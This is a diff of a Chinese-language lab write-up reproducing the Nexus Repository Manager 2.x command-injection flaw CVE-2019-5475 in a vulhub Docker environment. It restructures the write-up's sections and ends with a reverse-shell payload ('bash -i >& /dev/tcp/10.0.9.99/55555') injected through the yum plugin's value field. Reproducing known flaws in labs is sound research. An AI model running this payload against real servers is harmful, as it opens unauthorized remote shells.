@@ -16,24 +16,22 @@ vulhub环境 https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2019-7238
 
 # Nexus Repository Manager 2.x RCE (CVE-2019-5475)
 
+## 简介
+
 CVE编号：`CVE-2019-5475`
 
 > Nexus Repository Manager OSS <= 2.14.13 
 >
 > Nexus Repository Manager Pro <= 2.14.13
 
-编写docker-compose.yaml
+## 启动环境
 
-```yaml
-version: '3'
-services:
- web:
-   image: sonatype/nexus:2.12.1-01
-   ports:
-    - "8081:8081"
+```shell
+cd CVE-2019-7238
+docker-compose up -d
 ```
 
-`docker-compose up -d`   启动环境 
+## 简单分析
 
 漏洞点在yum插件，该插件是内置的，但是只有admin用户组才能利用此漏洞。其中createrepo 和mergerepo都可以触发漏洞
 
@@ -44,6 +42,8 @@ services:
 ![code](./image/code.png)
 
 因为拼接命令时后面有个`--version`,所以要用`&`把后面的分开，要不会执行不了前面的命令。
+
+## 复现过程
 
 value处的payload为`bash -c $@|bash 0 echo bash -i >& /dev/tcp/10.0.9.99/55555 0>&1 &`
 
